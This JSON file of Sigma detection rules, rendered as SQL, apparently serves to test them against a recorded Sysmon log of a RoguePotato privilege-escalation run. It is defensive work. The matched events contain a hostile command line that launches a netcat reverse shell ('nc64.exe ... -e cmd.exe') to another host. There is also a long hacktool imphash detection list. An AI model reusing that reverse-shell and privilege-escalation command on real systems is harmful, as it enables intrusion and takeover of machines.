[{
  "title": "Hacktool Execution - Imphash",
  "id": "24e3e58a-646b-4b50-adef-02ef935b9fc8",
  "description": "Detects the execution of different Windows based hacktools via their import hash (imphash) even if the files have been renamed",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (Hashes LIKE '%IMPHASH=BCCA3C247B619DCD13C8CDFF5F123932%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=3A19059BD7688CB88E70005F18EFC439%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=bf6223a49e45d99094406777eb6004ba%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=23867A89C2B8FC733BE6CF5EF902F2D1%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=A37FF327F8D48E8A4D2F757E1B6E70BC%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=F9A28C458284584A93B14216308D31BD%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=6118619783FC175BC7EBECFF0769B46E%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=959A83047E80AB68B368FDB3F4C6E4EA%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=563233BFA169ACC7892451F71AD5850A%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=87575CB7A0E0700EB37F2E3668671A08%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=13F08707F759AF6003837A150A371BA1%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=1781F06048A7E58B323F0B9259BE798B%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=233F85F2D4BC9D6521A6CAAE11A1E7F5%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=24AF2584CBF4D60BBE5C6D1B31B3BE6D%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=632969DDF6DBF4E0F53424B75E4B91F2%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=713C29B396B907ED71A72482759ED757%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=749A7BB1F0B4C4455949C0B2BF7F9E9F%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=8628B2608957A6B0C6330AC3DE28CE2E%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=8B114550386E31895DFAB371E741123D%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=94CB940A1A6B65BED4D5A8F849CE9793%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=9D68781980370E00E0BD939EE5E6C141%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=B18A1401FF8F444056D29450FBC0A6CE%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=CB567F9498452721D77A451374955F5F%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=730073214094CD328547BF1F72289752%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=17B461A082950FC6332228572138B80C%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=DC25EE78E2EF4D36FAA0BADF1E7461C9%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=819B19D53CA6736448F9325A85736792%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=829DA329CE140D873B4A8BDE2CBFAA7E%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=C547F2E66061A8DFFB6F5A3FF63C0A74%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=0588081AB0E63BA785938467E1B10CCA%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=0D9EC08BAC6C07D9987DFD0F1506587C%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=BC129092B71C89B4D4C8CDF8EA590B29%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=4DA924CF622D039D58BCE71CDF05D242%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=E7A3A5C377E2D29324093377D7DB1C66%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=9A9DBEC5C62F0380B4FA5FD31DEFFEDF%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=AF8A3976AD71E5D5FDFB67DDB8DADFCE%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=0C477898BBF137BBD6F2A54E3B805FF4%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=0CA9F02B537BCEA20D4EA5EB1A9FE338%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=3AB3655E5A14D4EEFC547F4781BF7F9E%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=E6F9D5152DA699934B30DAAB206471F6%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=3AD59991CCF1D67339B319B15A41B35D%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=FFDD59E0318B85A3E480874D9796D872%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=0CF479628D7CC1EA25EC7998A92F5051%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=07A2D4DCBD6CB2C6A45E6B101F0B6D51%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=D6D0F80386E1380D05CB78E871BC72B1%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=38D9E015591BBFD4929E0D0F47FA0055%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=0E2216679CA6E1094D63322E3412D650%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=ADA161BF41B8E5E9132858CB54CAB5FB%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=2A1BC4913CD5ECB0434DF07CB675B798%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=11083E75553BAAE21DC89CE8F9A195E4%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=A23D29C9E566F2FA8FFBB79267F5DF80%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=4A07F944A83E8A7C2525EFA35DD30E2F%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=767637C23BB42CD5D7397CF58B0BE688%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=14C4E4C72BA075E9069EE67F39188AD8%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=3C782813D4AFCE07BBFC5A9772ACDBDC%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=7D010C6BB6A3726F327F7E239166D127%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=89159BA4DD04E4CE5559F132A9964EB3%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=6F33F4A5FC42B8CEC7314947BD13F30F%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=5834ED4291BDEB928270428EBBAF7604%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=5A8A8A43F25485E7EE1B201EDCBC7A38%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=DC7D30B90B2D8ABF664FBED2B1B59894%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=41923EA1F824FE63EA5BEB84DB7A3E74%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=3DE09703C8E79ED2CA3F01074719906B%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=A53A02B997935FD8EEDCB5F7ABAB9B9F%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=E96A73C7BF33A464C510EDE582318BF2%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=32089B8851BBF8BC2D014E9F37288C83%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=09D278F9DE118EF09163C6140255C690%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=03866661686829d806989e2fc5a72606%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=e57401fbdadcd4571ff385ab82bd5d6d%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=84B763C45C0E4A3E7CA5548C710DB4EE%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=19584675D94829987952432E018D5056%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=330768A4F172E10ACB6287B87289D83B%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=885C99CCFBE77D1CBFCB9C4E7C1A3313%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=22A22BC9E4E0D2F189F1EA01748816AC%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=7FA30E6BB7E8E8A69155636E50BF1B28%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=96DF3A3731912449521F6F8D183279B1%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=7E6CF3FF4576581271AC8A313B2AAB46%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=51791678F351C03A0EB4E2A7B05C6E17%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=25CE42B079282632708FC846129E98A5%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=021BCCA20BA3381B11BDDE26B4E62F20%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=59223B5F52D8799D38E0754855CBDF42%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=81E75D8F1D276C156653D3D8813E4A43%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=17244E8B6B8227E57FE709CCAD421420%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=5B76DA3ACDEDC8A5CDF23A798B5936B4%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=CB2B65BB77D995CC1C0E5DF1C860133C%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=40445337761D80CF465136FAFB1F63E6%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=8A790F401B29FA87BC1E56F7272B3AA6%' ESCAPE '\\' OR Hashes LIKE '%IMPHASH=B50199E952C875241B9CE06C971CE3C1%' ESCAPE '\\'))"
  ],
  "rule_level": "critical",
  "tags": [
    "attack.credential-access",
    "attack.resource-development",
    "attack.t1588.002",
    "attack.t1003"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 1,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "RoguePotato.exe  -r 10.0.2.11 -e \"c:\\Users\\IEUser\\tools\\misc\\nc64.exe 10.0.2.11 3001 -e cmd.exe\" -l 9999",
      "Company": "?",
      "Computer": "MSEDGEWIN10",
      "CurrentDirectory": "c:\\Users\\IEUser\\tools\\PrivEsc\\",
      "Description": "?",
      "EventID": 1,
      "EventRecordID": 141988,
      "FileVersion": "?",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "SHA1=54058CC1FADAB57223F2D7004AD79333D63C628B,MD5=2DD755BE5842E71B304D2FBFF93EB2A3,SHA256=A4778D50307DE4AB13E48DE90D72B7C5E19B4F9356A611A9FAF95CFDA0523C46,IMPHASH=959A83047E80AB68B368FDB3F4C6E4EA",
      "IMPHASH": "959A83047E80AB68B368FDB3F4C6E4EA",
      "Image": "C:\\Users\\IEUser\\Tools\\PrivEsc\\RoguePotato.exe",
      "IntegrityLevel": "System",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "747F3D96-5461-5EBA-0000-0020E5030000",
      "LogonId": "0x3e5",
      "MD5": "2DD755BE5842E71B304D2FBFF93EB2A3",
      "Opcode": 0,
      "OriginalFileName": "?",
      "OriginalLogfile": "privesc_roguepotato_sysmon_17_18.evtx",
      "ParentCommandLine": "\"cmd.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "747F3D96-D7AC-5EB9-0000-0010BDEE2900",
      "ParentProcessId": 6404,
      "ProcessGuid": "747F3D96-DE14-5EB9-0000-0010BE064300",
      "ProcessID": 2896,
      "Product": "?",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SHA1": "54058CC1FADAB57223F2D7004AD79333D63C628B",
      "SHA256": "A4778D50307DE4AB13E48DE90D72B7C5E19B4F9356A611A9FAF95CFDA0523C46",
      "SystemTime": "2020-05-11T23:21:56.493742Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3548,
      "User": "NT AUTHORITY\\LOCAL SERVICE",
      "UserID": "S-1-5-18",
      "UtcTime": "2020-05-11 23:21:56.490",
      "Version": 5
    }
  ]
},
{
  "title": "HackTool - EfsPotato Named Pipe Creation",
  "id": "637f689e-b4a5-4a86-be0e-0100a0a33ba2",
  "description": "Detects the pattern of a pipe name as used by the hack tool EfsPotato",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND ((EventID=17 OR EventID=18) AND ((PipeName LIKE '%\\\\pipe\\\\%' ESCAPE '\\' OR PipeName LIKE '%\\\\pipe\\\\srvsvc%' ESCAPE '\\') AND (NOT (PipeName LIKE '%\\\\CtxShare%' ESCAPE '\\' OR PipeName LIKE '\\\\pipe\\\\%' ESCAPE '\\'))))"
  ],
  "rule_level": "high",
  "tags": [
    "attack.defense-evasion",
    "attack.privilege-escalation",
    "attack.t1055"
  ],
  "count": 2,
  "matches": [
    {
      "row_id": 2,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "MSEDGEWIN10",
      "EventID": 17,
      "EventRecordID": 141989,
      "EventType": "CreatePipe",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Image": "c:\\Users\\IEUser\\tools\\PrivEsc\\RoguePotato.exe",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "Opcode": 0,
      "OriginalLogfile": "privesc_roguepotato_sysmon_17_18.evtx",
      "PipeName": "\\RoguePotato\\pipe\\epmapper",
      "ProcessGuid": "747F3D96-DE14-5EB9-0000-0010BE064300",
      "ProcessID": 2896,
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "Rogue Epmapper np detected - possible RoguePotato privesc",
      "SystemTime": "2020-05-11T23:21:56.519003Z",
      "Task": 17,
      "ThreadID": 3548,
      "UserID": "S-1-5-18",
      "UtcTime": "2020-05-11 23:21:56.507",
      "Version": 1
    },
    {
      "row_id": 3,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "MSEDGEWIN10",
      "EventID": 18,
      "EventRecordID": 141990,
      "EventType": "ConnectPipe",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Image": "System",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "Opcode": 0,
      "OriginalLogfile": "privesc_roguepotato_sysmon_17_18.evtx",
      "PipeName": "\\RoguePotato\\pipe\\epmapper",
      "ProcessGuid": "747F3D96-545A-5EBA-0000-0010EB030000",
      "ProcessID": 2896,
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "Rogue Epmapper np detected - possible RoguePotato privesc",
      "SystemTime": "2020-05-11T23:21:56.562802Z",
      "Task": 18,
      "ThreadID": 3548,
      "UserID": "S-1-5-18",
      "UtcTime": "2020-05-11 23:21:56.554",
      "Version": 1
    }
  ]
},
{
  "title": "Elevated System Shell Spawned From Uncommon Parent Location",
  "id": "178e615d-e666-498b-9630-9ed363038101",
  "description": "Detects when a shell program such as the Windows command prompt or PowerShell is launched with system privileges from a uncommon parent location.",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND ((((Image LIKE '%\\\\powershell.exe' ESCAPE '\\' OR Image LIKE '%\\\\powershell\\_ise.exe' ESCAPE '\\' OR Image LIKE '%\\\\pwsh.exe' ESCAPE '\\' OR Image LIKE '%\\\\cmd.exe' ESCAPE '\\') OR (OriginalFileName='PowerShell.EXE' OR OriginalFileName LIKE 'powershell\\_ise.EXE' ESCAPE '\\' OR OriginalFileName='pwsh.dll' OR OriginalFileName='Cmd.Exe')) AND ((User LIKE '%AUTHORI%' ESCAPE '\\' OR User LIKE '%AUTORI%' ESCAPE '\\') AND LogonId='0x3e7')) AND (NOT ((ParentImage LIKE '%:\\\\Program Files (x86)\\\\%' ESCAPE '\\' OR ParentImage LIKE '%:\\\\Program Files\\\\%' ESCAPE '\\' OR ParentImage LIKE '%:\\\\ProgramData\\\\%' ESCAPE '\\' OR ParentImage LIKE '%:\\\\Windows\\\\System32\\\\%' ESCAPE '\\' OR ParentImage LIKE '%:\\\\Windows\\\\SysWOW64\\\\%' ESCAPE '\\' OR ParentImage LIKE '%:\\\\Windows\\\\Temp\\\\%' ESCAPE '\\' OR ParentImage LIKE '%:\\\\Windows\\\\WinSxS\\\\%' ESCAPE '\\') OR ParentImage IS NULL OR (ParentImage='' OR ParentImage='-'))) AND (NOT ((ParentImage LIKE '%:\\\\ManageEngine\\\\ADManager Plus\\\\pgsql\\\\bin\\\\postgres.exe' ESCAPE '\\' AND Image LIKE '%\\\\cmd.exe' ESCAPE '\\') OR (CommandLine LIKE '%:\\\\WINDOWS\\\\system32\\\\cmd.exe /c \"%' ESCAPE '\\' AND CurrentDirectory LIKE '%:\\\\WINDOWS\\\\Temp\\\\asgard2-agent\\\\%' ESCAPE '\\') OR (ParentImage LIKE '%:\\\\IBM\\\\SpectrumProtect\\\\webserver\\\\scripts\\\\%' ESCAPE '\\' AND CommandLine LIKE '%:\\\\IBM\\\\SpectrumProtect\\\\webserver\\\\scripts\\\\%' ESCAPE '\\')))))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.privilege-escalation",
    "attack.defense-evasion",
    "attack.execution",
    "attack.t1059"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 5,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe",
      "Company": "Microsoft Corporation",
      "Computer": "MSEDGEWIN10",
      "CurrentDirectory": "c:\\Users\\IEUser\\tools\\PrivEsc\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 141993,
      "FileVersion": "10.0.17763.592 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18",
      "IMPHASH": "272245E2988E1E430500B852C4FB5E18",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "System",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "747F3D96-5461-5EBA-0000-0020E7030000",
      "LogonId": "0x3e7",
      "MD5": "975B45B669930B0CC773EAF2B414206F",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "privesc_roguepotato_sysmon_17_18.evtx",
      "ParentCommandLine": "c:\\Users\\IEUser\\tools\\misc\\nc64.exe 10.0.2.11 3001 -e cmd.exe",
      "ParentImage": "C:\\Users\\IEUser\\Tools\\Misc\\nc64.exe",
      "ParentProcessGuid": "747F3D96-DE14-5EB9-0000-00107C0F4300",
      "ParentProcessId": 4468,
      "ProcessGuid": "747F3D96-DE14-5EB9-0000-001079154300",
      "ProcessID": 2896,
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SHA1": "8C5437CD76A89EC983E3B364E219944DA3DAB464",
      "SHA256": "3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2",
      "SystemTime": "2020-05-11T23:21:56.661289Z",
      "Task": 1,
      "TerminalSessionId": 0,
      "ThreadID": 3548,
      "User": "NT AUTHORITY\\SYSTEM",
      "UserID": "S-1-5-18",
      "UtcTime": "2020-05-11 23:21:56.654",
      "Version": 5
    }
  ]
},
{
  "title": "Uncommon Svchost Parent Process",
  "id": "01d2e2a1-5f09-44f7-9fc1-24faa7479b6d",
  "description": "Detects an uncommon svchost parent process",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (Image LIKE '%\\\\svchost.exe' ESCAPE '\\' AND (NOT ((ParentImage LIKE '%\\\\Mrt.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\MsMpEng.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\ngen.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\rpcnet.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\services.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\TiWorker.exe' ESCAPE '\\') OR ParentImage IS NULL OR (ParentImage='-' OR ParentImage='')))))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.defense-evasion",
    "attack.t1036.005"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 6,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc",
      "Company": "Microsoft Corporation",
      "Computer": "MSEDGEWIN10",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Host Process for Windows Services",
      "EventID": 1,
      "EventRecordID": 142033,
      "FileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "SHA1=A1385CE20AD79F55DF235EFFD9780C31442AA234,MD5=8A0A29438052FAED8A2532DA50455756,SHA256=7FD065BAC18C5278777AE44908101CDFED72D26FA741367F0AD4D02020787AB6,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69",
      "IMPHASH": "247B9220E5D9B720A82B2C8B5069AD69",
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "IntegrityLevel": "System",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "747F3D96-5461-5EBA-0000-0020E7030000",
      "LogonId": "0x3e7",
      "MD5": "8A0A29438052FAED8A2532DA50455756",
      "Opcode": 0,
      "OriginalFileName": "svchost.exe",
      "OriginalLogfile": "privesc_roguepotato_sysmon_17_18.evtx",
      "ParentCommandLine": "?",
      "ParentImage": "?",
      "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
      "ParentProcessId": 580,
      "ProcessGuid": "747F3D96-DE32-5EB9-0000-00103FC14300",
      "ProcessID": 2896,
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SHA1": "A1385CE20AD79F55DF235EFFD9780C31442AA234",
      "SHA256": "7FD065BAC18C5278777AE44908101CDFED72D26FA741367F0AD4D02020787AB6",
      "SystemTime": "2020-05-11T23:22:26.650196Z",
      "Task": 1,
      "TerminalSessionId": 0,
      "ThreadID": 3548,
      "User": "NT AUTHORITY\\SYSTEM",
      "UserID": "S-1-5-18",
      "UtcTime": "2020-05-11 23:22:26.451",
      "Version": 5
    }
  ]
},
{
  "title": "Windows Processes Suspicious Parent Directory",
  "id": "96036718-71cc-4027-a538-d1587e0006a7",
  "description": "Detect suspicious parent processes of well-known Windows processes",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND ((Image LIKE '%\\\\svchost.exe' ESCAPE '\\' OR Image LIKE '%\\\\taskhost.exe' ESCAPE '\\' OR Image LIKE '%\\\\lsm.exe' ESCAPE '\\' OR Image LIKE '%\\\\lsass.exe' ESCAPE '\\' OR Image LIKE '%\\\\services.exe' ESCAPE '\\' OR Image LIKE '%\\\\lsaiso.exe' ESCAPE '\\' OR Image LIKE '%\\\\csrss.exe' ESCAPE '\\' OR Image LIKE '%\\\\wininit.exe' ESCAPE '\\' OR Image LIKE '%\\\\winlogon.exe' ESCAPE '\\') AND (NOT (((ParentImage LIKE '%\\\\SavService.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\ngen.exe' ESCAPE '\\') OR (ParentImage LIKE '%\\\\System32\\\\%' ESCAPE '\\' OR ParentImage LIKE '%\\\\SysWOW64\\\\%' ESCAPE '\\')) OR ((ParentImage LIKE '%\\\\Windows Defender\\\\%' ESCAPE '\\' OR ParentImage LIKE '%\\\\Microsoft Security Client\\\\%' ESCAPE '\\') AND ParentImage LIKE '%\\\\MsMpEng.exe' ESCAPE '\\') OR (ParentImage IS NULL OR (ParentImage='' OR ParentImage='-'))))))"
  ],
  "rule_level": "low",
  "tags": [
    "attack.defense-evasion",
    "attack.t1036.003",
    "attack.t1036.005"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 6,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc",
      "Company": "Microsoft Corporation",
      "Computer": "MSEDGEWIN10",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Host Process for Windows Services",
      "EventID": 1,
      "EventRecordID": 142033,
      "FileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "SHA1=A1385CE20AD79F55DF235EFFD9780C31442AA234,MD5=8A0A29438052FAED8A2532DA50455756,SHA256=7FD065BAC18C5278777AE44908101CDFED72D26FA741367F0AD4D02020787AB6,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69",
      "IMPHASH": "247B9220E5D9B720A82B2C8B5069AD69",
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "IntegrityLevel": "System",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "747F3D96-5461-5EBA-0000-0020E7030000",
      "LogonId": "0x3e7",
      "MD5": "8A0A29438052FAED8A2532DA50455756",
      "Opcode": 0,
      "OriginalFileName": "svchost.exe",
      "OriginalLogfile": "privesc_roguepotato_sysmon_17_18.evtx",
      "ParentCommandLine": "?",
      "ParentImage": "?",
      "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
      "ParentProcessId": 580,
      "ProcessGuid": "747F3D96-DE32-5EB9-0000-00103FC14300",
      "ProcessID": 2896,
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SHA1": "A1385CE20AD79F55DF235EFFD9780C31442AA234",
      "SHA256": "7FD065BAC18C5278777AE44908101CDFED72D26FA741367F0AD4D02020787AB6",
      "SystemTime": "2020-05-11T23:22:26.650196Z",
      "Task": 1,
      "TerminalSessionId": 0,
      "ThreadID": 3548,
      "User": "NT AUTHORITY\\SYSTEM",
      "UserID": "S-1-5-18",
      "UtcTime": "2020-05-11 23:22:26.451",
      "Version": 5
    }
  ]
}]